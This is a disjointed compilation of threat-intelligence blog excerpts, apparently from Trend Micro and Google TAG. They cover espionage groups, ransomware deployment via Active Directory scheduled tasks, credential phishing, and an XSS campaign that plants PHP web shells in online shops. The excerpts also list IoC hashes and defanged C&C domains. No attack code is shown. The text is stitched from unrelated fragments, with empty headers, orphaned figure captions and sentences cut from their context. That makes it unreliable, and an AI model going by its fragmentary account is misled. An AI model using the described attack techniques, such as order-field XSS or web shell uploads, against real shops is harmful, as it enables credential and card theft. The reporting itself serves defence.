"With the constant evolution of shell scripts and Linux-based malicious backdoors and agents, it’s not surprising that the creators of Kinsing have kept in step."
"In this blog post Trend Micro researchers discuss the malware variant’s current capabilities, including the addition of features intended to make it more difficult to detect in infected machines."
The Malware that Usually Installs Ransomware and You Need to Remove Right Away
"This article lists the known malware strains that have been used over the past two years to install ransomware, all of which should serve as a ""code red"" moment for any organization."
"Once any of these malware strains are detected, system administrators should drop everything, take systems offline, and audit and remove the malware as a top priority."
Published New White Paper: Practical Risk Assessments for Smart Factories
"While cyberattacks that threaten smart factories cannot be ignored, it can be a struggle to decipher which security method is sufficient within your organization’s specific system, as well as where to start."
"To design a secure system, risk assessment is required."
This new white paper is intended to simulate risk assessment practices using an example of a fictitious smart factory.
"The risk assessment described in this document aims to assess and prioritize the risks of the entire smart factory environment, including IT."
"Post-Breach, Peatix Data Reportedly Found on Instagram, Telegram"
"In a data breach notice to affected users, events application Peatix said it learned that user account data had been improperly accessed."
"Upon further investigation, they found that usernames, email addresses, salted and hashed passwords, nicknames, preferred languages, countries and time zones had been compromised."
It’s unclear how many of its 5 million user base were affected or how the breach happened.
"Not long after the breach occurred, the compromised data was spotted on ads posted on Instagram stories, Telegram channels and various hacking forums."
How a Ransomware Attack Could Affect Retailers
"Cybercriminals have recently been focusing their efforts on the retail industry, launching ransomware-based attacks that could prove disastrous for businesses if it disrupts their operations during important shopping seasons."
"A ransomware attack on a retailer could mean thousands of lost sales opportunities in the short-term, and serious damage to reputation in the long-term."
Perception of an “unsafe” business could turn customers towards competitors who can offer a better and more secure shopping experience.
"What are your thoughts on the ransomware attacks on retailers as we approach the busiest times of the year for retailers, including Black Friday, Cyber Monday and the holiday season?"
Share them in the comments below or follow me on Twitter to continue the conversation: @JonLClay.
Tags Cloud | Malware | Expert Perspective | APT & Targeted Attacks | IoT | Ransomware |
"Articles, News, Reports"
One of the secrets of Trend Micro’s long-lasting success is being constantly on the lookout for where the next security threats might come from.
That’s why we’re focusing a great deal of our research and development efforts right now on the intersection of IT and operational technology (OT).
"This burgeoning world of connected IoT devices is particularly advanced in the manufacturing space, where huge gains are already being made."
"But as great as these leaps forward are, so are the risks if technology systems aren’t properly secured."
That’s why we’re thrilled to be joining the ROS-Industrial Consortium (ROS-I) to help accelerate the secure development of robotic Industry 4.0 applications.
It’s yet another important step for our stated mission: to secure the connected world.
"Why IIoT matters Industrial IoT (IIoT) systems are already streamlining production processes, improving cost efficiencies, and helping to drive greater agility and innovation for manufacturers."
It’s no coincidence that the global market for such solutions will grow at nearly 17% CAGR over the next six years to exceed $263 billion by 2027.
But with new technology always comes new cyber risk.
"As connectivity is introduced to industrial computing devices, the challenge is managing the threat from remote attackers."
"System and software vulnerabilities could be probed to hijack devices, sabotage production processes and steal intellectual property."
"Robots are a particular risk—not only because so much of modern manufacturing relies on them, but also because many of these machines rely on legacy technology dating back decades."
"These custom, proprietary programming languages and unique ecosystems can make security complex, and lead to unpatched vulnerabilities which sophisticated attackers could exploit, with serious consequences."
Shaping the roadmap ROS-I is an open-source project devoted to extending the capabilities of the Robot Operating Systems (ROS) into industrial hardware and applications.
"The job of the ROS-I Consortium is to prioritize these capabilities, offer code quality standards and provide technical support and training."
"As an associate member of the consortium, Trend Micro will now be able to participate in technical and strategic projects and help to shape the ROS-I roadmap."
"In fact, we’ve already demonstrated our value to the organization in research last year, which uncovered design flaws and vulnerabilities in legacy programming languages used by some of its products."
That resulted in our collaboration to develop secure network guidelines for industrial robots using ROS.
Securing the future Trend Micro also recently started looking at the security of the Data Distribution Service (DDS).
This protocol is used heavily by ROS2 and will therefore be another area in which we hope to deliver tremendous value to ROS-I and end-customers going forward.
Trend Micro is in many ways an unusual member of the consortium.
"Most either use ROS/ROS2 in their products, for example as robot manufacturers, or they want to help develop the software."
"We do neither, but we plan to work with the consortium to enhance security-by-design in ROS-I software."
"In fact, Trend Micro is only the second cybersecurity specialist to join."
"Securing IIoT systems is hard: it requires capabilities across the cloud, the network, and the devices themselves."
"For more info, check out our Smart Factory solutions: https://www.trendmicro.com/en_us/business/solutions/iot/smart-factory.html."
"Tags APT & Targeted Attacks | IoT | Expert Perspective | Articles, News, Reports"
Cloud computing is on a roll.
"Gartner predicts that spending on public cloud services including IaaS, SaaS and PaaS will reach nearly $500bn this year and grow by over 21% to hit $600bn by 2023."
But security concerns persist.
Marketplaces like the one offered by AWS make it a lot easier to get the right security tools in the hands of those that need them most.
But finding the right cybersecurity partners can still be something of an operational challenge involving a mountain of manual work.
That’s why we’re delighted to be a launch partner for new AWS Marketplace feature.
Marketplace Vendor Insights takes the pain out of due diligence by delivering the information prospective customers need—reducing friction and accelerating the journey to cloud security.
A tech tipping point We all know why global organizations are turning in their droves to cloud computing services and infrastructure.
"For many, it was the pandemic that pushed them over a technology tipping point."
"For others, digital transformation had been a priority for much longer, but the events of the past two years added a new sense of urgency."
"Cloud investments are delivering innovative customer experiences, streamlining business processes and driving enterprise agility across the planet."
"But such initiatives must be built on solid, secure foundations."
Trend Micro blocked 101% more cloud-based email threats in 2021 than the previous year.
We also know that threat actors are actively scanning for misconfigured cloud environments.
In-house skills shortages and the rapid pace of innovation from cloud service providers exacerbate this challenge.
The expansive use of open source code by DevOps teams adds another element of risk which requires urgent attention.
"Climbing a mountain, the easy way IT leaders know that cloud security is a shared responsibility."
The challenge is often finding the right partners to align with their specific requirements.
"Even though platforms like the AWS Marketplace have streamlined the process of procurement immeasurably for cloud builders, friction persists."
"Security is a complex business, especially in the cloud, where many traditional rules associated with the on-premises world no longer apply."
That means customers have to ask prospective providers like Trend Micro a mountain of questions.
"In fact, we receive extensive spreadsheets full of these questions several times a week."
"They often contain hundreds of queries to process, which may have been written by lawyers who don’t fully understand the subject matter."
"While buyers usually aim for lead times of weeks or months, the questionnaires themselves can get stuck in a bottleneck if forwarded first to IT service partners."
This is where AWS Marketplace Vendor Insights comes in.
"It collects data from ISV partners like Trend Micro via two mechanisms: ISVs upload compliance certificates, which are scanned and processed, with the salient information extracted by Marketplace Vendor Insights AWS technology is deployed to ISV production accounts to directly monitor and inspect configuration of technology resources and collect other critical information"
The result is a win-win for ISVs like Trend Micro and security-minded AWS customers.
"With Marketplace Vendor Insights, IT leaders can review compliance attestations and double click on more details about ISV security best practices directly from the AWS Marketplace."
"It also enables buyers to view vendor information in the same way, allowing for true apples to apples comparison."
"In so doing, it eliminates the need for endless back-and-forth communications between ISV and prospective customer."
It’s about standardizing and streamlining an important but cumbersome process to fast-track due diligence—ultimately enabling enterprises to extract value from platforms like Trend Micro Cloud One even quicker.
Tags Cloud | Latest News | Data center | Compliance & Risks | APT & Targeted Attacks | Ransomware |
"Articles, News, Reports"
"Tropic Trooper, a threat actor group that targets government, military, healthcare, transportation, and high-tech industries in Taiwan, the Philippines, and Hong Kong, has been active since 2011."
The group was reportedly using spear-phishing emails with weaponized attachments to exploit known vulnerabilities.
"Primarily motivated by information theft and espionage, the group has also been seen adopting different strategies such as fine-tuning tools with new behaviors and going mobile with surveillanceware."
We found that Tropic Trooper’s latest activities center on targeting Taiwanese and the Philippine military’s physically isolated networks through a USBferry attack (the name derived from a sample found in a related research).
"We also observed targets among military/navy agencies, government institutions, military hospitals, and even a national bank."
"The group employs USBferry, a USB malware that performs different commands on specific targets, maintains stealth in environments, and steals critical data through USB storage."
"We started tracking this particular campaign in 2018, and our analysis shows that it uses a fake executable decoy and a USB trojan strategy to steal information."
"Based on data from the Trend Micro™ Smart Protection Network™ security infrastructure, USBferry attacks have been active since 2014."
"We found the group was focused on stealing defense-, ocean-, and ship-related documents from target networks, which led us to believe that Tropic Trooper’s main purpose is to exfiltrate confidential information or intelligence."
Figure 1.
"A sample scenario of the USBferry attack Tropic Trooper is well aware that military or government organizations may have more robust security in their physically isolated environments (i.e., the use of biometrics or USB use in a quarantined machine before an air-gapped environment)."
The group then targets potentially unsecured related organizations that could serve as jumping-off points for attacks.
"For instance, we observed Tropic Trooper move from a military hospital to the military’s physically isolated network."
"For one thing, the USBferry malware already has at least three versions, with different variants and components, at the time of writing."
The malware tries to check if the target machine has a USB plug-in and copies the USBferry installer into the USB storage.
"The activities vary in target environments; some execute commands, source target files or folder lists, and copy files from physically isolated hosts to compromised hosts, among other things."
"Figure 2. USBferry malware’s first version, where the EXE file is the USBferry malware and the DLL file is trojan TROJ_YAHOYAH"
"This version also changes the malware location and its name to UF, an abbreviation for USBferry."
Figure 3.
USBferry malware’s second version combined into one file
Figure 4.
USBferry malware’s third version becomes resident in memory How USBferry targets air-gapped systems
"In our technical brief, we broke down how Tropic Trooper has changed the way it uses the abovementioned USBferry versions in attacks."
Figure 5. USBferry malware using USB worm infection strategy
"USBferry attack scenario, version UF1.0 20160226"
"The decoy file first drops a flash_en.inf DLL file, which is a USBferry loader, and tries to load the encrypted USBferry malware"
"The encrypted USBferry malware is embedded in the loader resource section, and the loader drops it into the C:\Users\Public\Documents\Flash folder and names it flash.dat"
"After the encrypted payload is loaded, the loader injects a malicious DLL into rundll32.exe."
"The USBferry malware also loads a C&C configuration file and flash_en.dat, which is also located in the C:\Users\Public\Documents\Flash"
The USBferry malware then tries to connect to the download site and uses a Windows command to collect/copy target host data
"Some backdoors used by Tropic Trooper use injection to execute its routines, while others execute directly and run itself consistently."
The group also uses steganography to mask their backdoor routines and evade anti-malware and network perimeter detection.
"Based on the malware version number, this backdoor’s first version was developed in or before 2011."
Figure 7.
"The backdoor version name, registered service name, and malware components’ filenames Welcome To IDShell 1.0 20150310’s backdoor (detected as BKDR_IDSHELL.ZTFC-A) - The purpose of this backdoor, which has two types, including a steganography jpg version, is to recon the target machine."
"Like other versions, it uses the DNS protocol to communicate with the backdoor controller."
The traffic is encrypted to evade detection.
Figure 8.
The backdoor’s communication traffic
Hey!
"Welcome Server 2.0’s backdoor (detected as BKDR_TEBSHELL.ZTGK) – This is the latest version of the backdoor, available in 32-bit and 64-bit versions, which uses an invisible web shell for remote control and network security evasion."
Figure 9.
"Port scanning tools, which are available on the internet."
The overview provided above highlights how putting critical information in physically isolated networks is not a bulletproof solution for defending against cyberespionage.
Steganography isn’t just used to deliver encrypted payloads; it can also be used to transfer information to a C&C server.
Threat actors like Tropic Trooper can also use an invisible web shell to hide its C&C server location and make incident response tricky.
Enforce the principle of least privilege.
"Read our technical brief, which discusses in full our analyses of Tropic Trooper’s recent activities, the USBferry malware, and IoCs."
Attack Chain Figure 1. Attack chain of Tropic Trooper’s operations
Here’s a summary of the attack chain of Tropic Trooper’s recent campaigns:
"Execute a command through exploits for CVE-2017-11882 or CVE-2018-0802, security flaws in Microsoft Office’s Equation Editor (EQNEDT32.EXE)."
UserInstall.exe will abuse the BITSadmin command-line tool to create a job and launch sidebar.exe.
We also observed malicious documents that don’t need to download anything from the internet as the backdoor’s dropper is already embedded in the document.
Tropic Trooper uses exploit-laden Microsoft Office documents to deliver malware to targets.
Below is a screenshot of the document used in their latest campaigns: Figure 2.
Malicious document used by Tropic Trooper PDB Strings as Context Clues
Figure 3.
PDB strings inside the MSI file
"The first PDB string has a certain ss2/Projects/MsiWrapper (Project MsiWrapper) in it, which we found to be an open-source application that converts executable setup programs to MSI files."
Another interesting PDB string we found is - D:\Work\Project\VS\house\Apple\Apple_20180115\Release\InstallClient.pdb.
"This is carried out to evade antivirus (AV) detection, because wab32res.dll is loaded by a benign file."
Figure 4.
The installer drops three files into the Apple/Update directory Figure 5.
PDB strings inside the loader file
"The backdoor, TClient (BKDR_TCLT.ZDFB), is so named from its own PDB string."
Figure 6.
TClient is injected into dllhost.exe Malware Analysis wab32res.dll (FakeRun loader) loads TClient.
Figure 7.
The loader checking the sidebar process Figure 8.
The malicious loader injecting the backdoor into dllhost.exe Figure 9.
"Comparison of TClient’s configuration format in 2016 (left, from other researchers) and 2018 (right) TClient will use SSL to connect to Tropic Trooper’s C&C server."
TClient is actually one of Tropic Trooper’s other backdoors.
TClient uses symmetric encryption to decrypt its configuration with one 16-byte key in 2018.
The image and table below illustrate TClient’s encrypted configuration that we decrypted (via Python code): Figure 10.
Snapshot of code we used to decrypt TClient’s configuration Figure 11.
Encrypted backdoor configuration
Description Decryption Strings
Proxy: 0
Figure 12.
Decrypted backdoor configuration
Reverse analysis of TClient allowed us to determine how to decrypt the C&C information.
TClient will use custom SSL libraries to connect the C&C server.
Figure 13.
The TSSL project has 64-bit version.
"TClient, for instance, uses DLL hijacking and injection that may not be as noticeable to others."
"The vulnerabilities that Tropic Trooper’s campaigns have been patched last January, for instance."
Disable or secure the use of system administration tools such as PowerShell and other command-line tools that may be abused.
Nurture a culture of cybersecurity.
"Spear-phishing emails, for instance, rely on baiting targets with socially engineered documents."
Indicators of Compromise (IoCs) Related Hashes (SHA-256): Detected as CVE-2018-0802.ZTFC: 1d128fd61c2c121d9f2e1628630833172427e5d486cdd4b6d567b7bdac13935e BKDR_TCLT.ZDFB: 01087051f41df7bb030256c97497f69bc5b5551829da81b8db3f46ba622d8a69 BKDR64_TCLT.ZTFB: 6e900e5b6dc4f21a004c5b5908c81f055db0d7026b3c5e105708586f85d3e334 TROJ_SCLT.ZTFB: 49df4fec76a0ffaee5e4d933a734126c1a7b32d1c9cb5ab22a868e8bfc653245 TROJ_TCDROP.ZTFB: b0f120b11f727f197353bc2c98d606ed08a06f14a1c012d3db6fe0a812df528a d65f809f7684b28a6fa2d9397582f350318027999be3acf1241ff44d4df36a3a 85d32cb3ae046a38254b953a00b37bb87047ec435edb0ce359a867447ee30f8b TROJ_TCLT.ZDFB: 02281e26e89b61d84e2df66a0eeb729c5babd94607b1422505cd388843dd5456 fb9c9cbf6925de8c7b6ce8e7a8d5290e628be0b82a58f3e968426c0f734f38f6 URLs related to C&C communication: qpoe[.]com wikaba[.]com tibetnews[.]today dns-stuff[.]com 2waky[.]com Tags Network | APT & Targeted Attacks | Research
The five individuals were reportedly connected to the hacking group known as APT41.
"Justice officials say that the group's intrusions allowed the hackers to steal source code, customer account data, and personally identifiable information (PII)."
This is not the first time that APT41 activities have been scrutinized — the group has been active for some time.
"Just last May, Trend Micro connected the group to ransomware attacks on Taiwanese organizations."
The attack chain of ransomware incidents in Taiwan
"The ransomware attack chain is outlined in Figure 1; however, we currently do not know the initial arrival vector of this threat into a potential victim's network."
"After logging in to the active directory server, the threat actor modifies the active directory server group policy object — this includes a request that all domain account members create a scheduled task and execute the malware."
"In the final step, the other subsidiary active directory servers and all the endpoint machines will download the scheduled task and execute the ransomware. Figure.1 The attacker uses an Active Directory (AD) scheduled task to deploy the ransomware in the customer environment."
Scheduled tasks play a very important role in this incident.
The threat actors use a scheduled task command to spread and infect a victim's environment.
"The screenshot in Figure 2 shows how the threat actor uses SMB and internal IIS Web Service to copy ""lc.tmp"" (the main ransomware loader in this incident) to other victims' host machines."
"After that, the PowerShell command executes the main ransomware loader."
Figure 2.
How a scheduled task delivers the malware to a victim's environment
"The loaders decrypted the next-stage payloads, which were either embedded inside itself or stored on the disk as separate files."
The next-stage payloads were CobaltStrike in this series of incidents.
More than just a single occurrence
Possible link to Chinese espionage
The C&C server 104[.]233[.]224[.]227 was hosted under a small hosting service with only 64 IPs under it.
"To help defend users against APT41 specifically, we have developed an assessment tool that can scan endpoints for file-based indicators collected from global intelligence sources."
"Indicators of Compromise SHA 256 Malware Family 2367326f995cb911c72baadc33a3155f8f674600 NTDSDump 75e49120a0238749827196cebb7559a37a2422f8 COLDLOCK 5b9b7fb59f0613c32650e8a3b91067079bcb2fc2 COLDLOCK e7aa8f55148b4548ef1ab9744bc3d0e67588d5b7 COLDLOCK ad6783c349e98c2b4a8ce0b5c9207611309adca7 COBALTSTRIKE 29cc0ff619f54068ce0ab34e8ed3919d13fa5ee9 COLDLOCK 2051f0a253eced030539a10ebc3e6869b727b8a9 COLDLOCK a2046f17ec4f5517636ea331141a4b5423d534f0 COLDLOCK 03589dffe2ab72a0de5e9dce61b07e44a983d857 COBALTSTRIKE 9d6feb6e246557f57d17b8df2b6d07194ad66f66 COLDLOCK 28d172e374eebc29911f2152b470528fc695662e PWDDUMPER 574fb6a497c032f7b9df54bc4669d1eb58d78fb4 ASPSHELL *One of the sources for this table is the original report from the U.S. Justice Department Tags Latest News | APT & Targeted Attacks | Endpoints | Cyber Crime | Network | Articles, News, Reports"
"Like previous websites we’ve seen set up by this actor, this website has a link to their PGP public key at the bottom of the page."
We encourage anyone who discovers a Chrome vulnerability to report that activity through the Chrome Vulnerabilities Rewards Program submission process.
Email:
Attacker Owned Domains:
"To protect our users, Google’s Threat Analysis Group (TAG) routinely hunts for 0-day vulnerabilities exploited in-the-wild."
"If the link was not active, the user was redirected directly to a legitimate website."
"We assess that these campaigns delivered ALIEN, a simple Android malware in charge of loading PREDATOR, an Android implant described by CitizenLab in December 2021."
ALIEN lives inside multiple privileged processes and receives commands from PREDATOR over IPC.
"We did not capture the subsequent stages, but assess the attackers did not have exploits for the current version of Chrome (91.0.4472) at that time, but instead used n-day exploits targeting Samsung Browser, which was running an older and vulnerable version of Chromium."
Related IOCs
"We recovered the exploit used to escape the Chrome Sandbox, but not the initial RCE exploit."
We haven’t retrieved a copy of the exploit.
Related IOCs
Related IOCs
We would also like to thank Project Zero for their technical assistance in helping analyze these bugs.
We remain committed to updating the community as we uncover these campaigns.
We look forward to continuing our work in this space and advancing the safety and security of our users around the world.
"NOTE: On May 20th, we updated our attribution to more precisely describe our findings."
"Since our last update, TAG has observed a continuously growing number of threat actors using the war as a lure in phishing and malware campaigns."
"As always, we continue to publish details surrounding the actions we take against coordinated influence operations in our quarterly TAG bulletin."
The data is then exfiltrated via email to a compromised email account.
Malware samples:
TAG would like to thank the Yahoo! Paranoids Advanced Cyber Threats Team for their collaboration in this investigation.
"Recently observed Turla domains: COLDRIVER, a Russian-based threat actor sometimes referred to as Callisto, continues to use Gmail accounts to send credential phishing emails to a variety of Google and non-Google accounts."
"The group's tactics, techniques and procedures (TTPs) for these campaigns have shifted slightly from including phishing links directly in the email, to also linking to PDFs and/or DOCs hosted on Google Drive and Microsoft One Drive."
Within these files is a link to an attacker controlled phishing domain.
These phishing domains have been blocked through Google Safe Browsing – a service that identifies unsafe websites across the web and notifies users and website owners of potential harm.
"Recently observed COLDRIVER credential phishing domains: Ghostwriter, a Belarusian threat actor, has remained active during the course of the war and recently resumed targeting of Gmail accounts via credential phishing."
"This campaign, targeting high risk individuals in Ukraine, contained links leading to compromised websites where the first stage phishing page was hosted."
"If the user clicked continue, they would be redirected to an attacker controlled site that collected the users credentials."
"In mid-April, TAG detected a Ghostwriter credential phishing campaign targeting Facebook users."
"Recently observed Ghostwriter credential phishing domains and emails: Curious Gorge, a group TAG attributes to China's PLA SSF, has remained active against government, military, logistics and manufacturing organizations in Ukraine, Russia and Central Asia."
"Upon discovery, all identified websites and domains were added to Safe Browsing to protect users from further exploitation."
"The team continues to work around the clock, focusing on the safety and security of our users and the platforms that help them access and share important information."
"While we are actively monitoring activity related to Ukraine and Russia, we continue to be just as vigilant in relation to other threat actors globally, to ensure that they do not take advantage of everyone’s focus on this region."
"On any given day, Google's Threat Analysis Group (TAG) is tracking more than 270 targeted or government-backed attacker groups from more than 50 countries."
"Our team of analysts and security experts is focused on identifying and stopping issues like phishing campaigns, zero-day vulnerabilities and hacking against Google, our products and our users."
"Today, we’re sharing recent findings on government-backed phishing, threats and disinformation, as well as a new bulletin to share information about actions we take against accounts that we attribute to coordinated influence campaigns."
"Last month, we sent 1,755 warnings to users whose accounts were targets of government-backed attackers."
"Generally, 2020 has been dominated by COVID-19."
"The pandemic has taken center stage in people’s everyday lives, in the international news media, and in the world of government-backed hacking."
"Recently, we shared information on numerous COVID-themed attacks discovered and confirmed by our teams."
"We continue to see attacks from groups like Charming Kitten on medical and healthcare professionals, including World Health Organization (WHO) employees."
"And as others have reported, we’re seeing a resurgence in COVID-related hacking and phishing attempts from numerous commercial and government-backed attackers."
"As one example, we've seen new activity from “hack-for-hire” firms, many based in India, that have been creating Gmail accounts spoofing the WHO."
"The lures themselves encourage individuals to sign up for direct notifications from the WHO to stay informed of COVID-19 related announcements, and link to attacker-hosted websites that bear a strong resemblance to the official WHO website."
"The sites typically feature fake login pages that prompt potential victims to give up their Google account credentials, and occasionally encourage individuals to give up other personal information, such as their phone numbers."
"To help protect users against these kinds of tracks, our Advanced Protection Program (APP) utilizes hardware security keys and provides the strongest protections available against phishing and account hijackings."
APP was designed specifically for high-risk accounts.
"Government-backed or state-sponsored groups have different goals in carrying out their attacks: Some are looking to collect intelligence or steal intellectual property; others are targeting dissidents or activists, or attempting to engage in coordinated influence operations and disinformation campaigns."
"Our products are designed with robust built-in security features, like Gmail protections against phishing and Safe Browsing in Chrome, but we still dedicate significant resources to developing new tools and technology to help identify, track and stop this kind of activity."
"In addition to our internal investigations, we work with law enforcement, industry partners, and third parties like specialized security firms to assess and share intelligence."
"When we find attempts to conduct coordinated influence operations on our platforms, we work with our Trust & Safety teams to swiftly remove such content from our platforms and terminate these actors’ accounts."
"We take steps to prevent possible future attempts by the same actors, and routinely exchange information and share our findings with others in the industry."
"We’ve also shared occasional updates about this kind of activity, and today we’re introducing a more streamlined way of doing this via a new, quarterly bulletin to share information about actions we take against accounts that we attribute to coordinated influence campaigns (foreign and domestic)."
"Our actions against coordinated influence operations from January, February and March can be found in the Q1 Bulletin."
"Since March, we’ve removed more than a thousand YouTube channels that we believe to be part of a large campaign and that were behaving in a coordinated manner."
"These channels were mostly uploading spammy, non-political content, but a small subset posted primarily Chinese-language political content similar to the findings of a recent Graphika report."
We’ll also share additional removal actions from April and May in the Q2 Bulletin.
"Our hope is that this new bulletin helps others who are also working to track these groups, such as researchers studying this issue, and we hope these updates can help confirm findings from security firms and others in the industry."
"We will also continue to share more detailed analysis of vulnerabilities we find, phishing and malware campaigns that we see, and other interesting or noteworthy trends across this space."
"Cybercriminals have different motivations: for example, some malicious actors have disruptive political attacks as their objective, while others might be more inclined towards cyberespionage and gathering information on their victims."
"Of course, financial gain remains a powerful cybercrime motivation — perhaps even the most common one."
"Some malicious actors, such as ransomware operators, earn directly from their cyberattacks."
"Others, however, prefer to act as “cybermercenaries,” selling their services to anyone willing to pay."
"One of the most prolific cybermercenaries is Void Balaur, a Russian-speaking threat actor group that has launched attacks against different sectors and industries all over the world."
"Although Void Balaur offers a wide range of services, the group’s bread and butter is cyberespionage and information theft, selling highly sensitive information on individuals in underground forums and websites such as Probiv."
The group primarily targets email accounts and mailboxes.
"While it offers standard mailbox copies that was likely stolen with the help of credential phishing, Void Balaur also offers copies of mailboxes that have not been interacted with — for a higher price."
"This option is particularly interesting since it would be extremely difficult under normal circumstances to gather the contents of a mailbox without any user interaction, which points to possibilities such as insider assistance or even the compromise of the email provider’s systems."
Figure 1.
"Countries in which Void Balaur email targets were located In addition, Void Balaur also offers their customers access to a large amount of private data, which includes information such as flight and travel data (passports and ticket purchases); criminal records; financial records and credit histories; pension funds; and even printouts of SMS messages."
It’s easy to see why the services of a cybermercenary like Void Balaur is in demand — these types of information can be very useful for a group or an individual who wants to launch an attack on specific targets.
Void Balaur’s high-profile targets
What makes Void Balaur’s attacks particularly noteworthy is the often-lofty status of its targets.
"While the threat actor has been known to offer its services to a more general audience — as seen in its online advertisements in the underground — research from groups such as eQualit.ie and Amnesty International show that Void Balaur is likely also involved in attacks against higher profile victims, ranging from human rights activists and journalists to politicians and even presidential candidates."
One of the group’s more notable campaigns involved attacks that targeted the private email addresses of government officials and politicians in an Eastern European country in September 2021.
"Living up to its cybermercenary label, Void Balaur does not limit itself to the geopolitical scene."
Organizations that have access to a large amount of private information are also frequent victims of the group.
"These targets belong to different industries such as the telecommunications, retail, financial, medical, and even the biotech sectors."
"Organizational leaders and employees that are heavily involved with the company’s core business are among the threat actor’s favored targets, since these individuals will likely have access to the kind of information the group seeks."
Curtailing cybermercenary attacks
"Given what we’ve seen of cybermercenaries like Void Balaur, it is likely that these groups have access to a large number of tools and infrastructure that allows them to launch attacks even against prominent individuals and organizations."
"However, this does not mean that practicing and implementing the right security safeguards will not help in defending against cybermercenary attacks."
The following security best practices can help both individuals and organizations thwart cybermercenary attacks (and cyberattacks in general): Employ the services of a reputable provider that places high priority on security.
Consider using dedicated two-factor authentication apps or devices such as Yubikey instead of relying on SMS.
"Use encryption systems for communication, especially when it involves sensitive information."
Encrypt the drives of all computers and other machines that are used to store sensitive information.
Practice good security hygiene by deleting old emails and messages to minimize the chances of an attacker gaining access to private information.
"Learn more about the activities and targets of Void Balaur in our research paper, Void Balaur: Tracking a Cybermercenary’s Activities."
"Tags APT & Targeted Attacks | Cyber Crime | Research | Articles, News, Reports"
The US Department of Energy (DOE) recently launched the Operational Technology (OT) Defender Fellowship.
"In collaboration with DOE's Idaho National Laboratory (INL) and the Foundation for Defense of Democracies' (FDD) Center for Cyber and Technology Innovation (CTTI), the OT Defender Fellowship hopes to expand the knowledge of primary US front-line critical infrastructure defenders."
Sharing cybersecurity knowledge to the private sector
It will enable the program participants to engage with various cyber and national experts across the US government.
The program aims to also equip them with a better understanding of the strategies and tactics of the country's adversaries and how the US government cyber operations defend the nation.
The Fellowship aligns with the bipartisan recommendations of the congressionally mandated Cyberspace Solarium Commission (CSC).
King also explains that the CSC report supports operationalizing cybersecurity partnership with the private sector and remolding how the government works with the private sector.
King added that this DOE initiative will better protect the US from cyberattacks.
"Tom Fanning, Chairman, President & CEO of Southern Company, says that national security greatly depends on the collaboration between private sector and the government."
They must also be nominated by their organization's leadership and commit to the requirements imposed by the program.
"The participant must also be a US citizen and currently hold or be able to attain federal security clearance at the Secret or higher level, or be in a role that justifies application for Department of Homeland Security-sponsored private sector clearance."
"For more information about the OT Defender Fellowship, visit https://inl.gov/otdefender/ Tags Latest News | ICS OT | APT & Targeted Attacks | IoT | Articles, News, Reports"
"Since 2019, we have been tracking a threat campaign we dubbed as “Water Pamola.”"
"The campaign initially compromised e-commerce online shops in Japan, Australia, and European countries via spam emails with malicious attachments."
"However, since early 2020, we’ve noticed some changes to Water Pamola’s activity."
Victims are now mainly located only in Japan.
Recent telemetry data indicates that the attacks are not being launched via spam anymore.
"Instead, malicious scripts are being executed when the administrators look into customer orders in their online shop’s administration panel."
Figure 1.
"The Water Pamola attack chain After further searching, we noticed that an online store administrator asked about a strange online order that contains JavaScript code inserted into the field where the customer’s address or company name would normally be located."
This script is likely activated by exploiting a cross-site scripting (XSS) vulnerability in the said store’s administration portal.
Figure 2.
The question asked on a forum showing the payload related to Water Pamola.
"The above is a screenshot of the text in a forum, which is translated by Google Translate as Problem, there is an order that seems to be a mischievous order."
The following characters are included in the address and company name.
The script connects to the Water Pamola’s server and downloads additional payloads.
"Taken together, this led us to believe that Water Pamola places orders with this embedded XSS script across many targeted online shops."
"If they are vulnerable to this XSS attack, these will be loaded when the victim (i.e., an administrator at the targeted merchant) opens the order within their management panel."
We have collected many attack scripts they delivered to different targets.
"The malicious behavior performed by the scripts includes page grabbing, credential phishing, web shell infection, and malware delivery."
This campaign appears to be financially motivated.
"In at least one instance, a site that Water Pamola attacked later disclosed that they had suffered a data breach."
"Their server was illegally accessed and personal information, which included names, credit card numbers, card expiration dates, and credit card security codes, were potentially leaked."
"This breach might be associated with Water Pamola, and it hints that this campaign’s overall goal is to steal the credit card data (similar to Magecart campaigns)."
Analysis of the XSS attack
"As previously mentioned, Water Pamola sent online shopping orders appended with a malicious XSS script to attack e-commerce administrators."
"It’s worth mentioning that they are not targeting a specific e-commerce framework, but e-commerce systems in general."
"If the store’s e-commerce system is vulnerable to XSS attacks, the malicious script will be loaded and executed on the merchant’s management panel once someone (like a system administrator or store employee) opens the said order."
"These scripts were managed with an XSS attack framework called “XSS.ME,” which helps attackers deal with their attack scripts and the stolen information."
The source code of this framework is shared across many Chinese public forums.
The basic attack script provided by the framework could report the victim’s location and browser cookies.
We observed that the scripts used during the attacks were customized.
"The attackers delivered a variety of different XSS scripts, which could include one or more of the following behaviors: Page Grabber"
The script sends an HTTP GET request to a specified URL address and forwards the received response to Water Pamola’s server.
This is usually used during an early stage of the attack to grab content from the victim’s management page.
Doing so allows the threat actor to understand the environment and design attack scripts appropriate to the victim’s environment. Figure 3.
The script for grabbing page content and sending it back to the attacker Credential Phishing
Some of the delivered scripts revealed that the campaign was trying to obtain administrator credentials for e-commerce websites using two different approaches.
The first way involves appending a fake login form to the page.
The script hooks the mouse click event.
"If the victim enters the credential in the fake form and clicks anywhere on the page, the script will take the credentials, encode them using base64, replace some characters with custom substrings, and then upload these to Water Pamola’s server. Figure 4."
The script to create and delete fake login form for credential phishing The other approach involves showing an authorization error message and then redirecting the user to a phishing website that asks users to enter their credentials.
"The subdomains of their phishing sites were configured to match the names of the targets’ domain, such as “{victim’s domain}[.]basic-authentication[.]live”."
Figure 5.
The script replaces the page content with an authorization error message and redirects users to the phishing website Webshell/PHP backdoor injection
"Some of the delivered malicious scripts attempt to install backdoors to the websites built with the EC-CUBE framework, which is popular in Japan."
"The attack we found only works on Series 2 of EC-CUBE; the current version is Series 4, with Series 2 now under extended support."
There are three different approaches used to upload the backdoor.
The first method is uploading a PHP web shell file by calling the native API provided by the framework.
"The name of the web shell file is hardcoded to be either “ec_ver.php,” “log3.php,” or “temp.php.”"
The web shell can execute any PHP code sent by an HTTP POST request to the web shell.
Note the screenshot in Figure 6: The same web shell with the same “only_pcd” keyword is mentioned in this Chinese blog post.
"The blog post describes a web shell with two components — a PHP script and an HTML uploading file — however, the second one is not needed as the proper POST request can be created with any custom or third-party tool (e.g., Fiddler). Figure 6."
"The script for uploading the PHP web shell to an e-commerce website The second method is modifying the page header to inject PHP code, which will then execute any PHP code, sent by the parameter “ec_ver2update” in the HTTP request."
Note that the PHP code below is obfuscated.
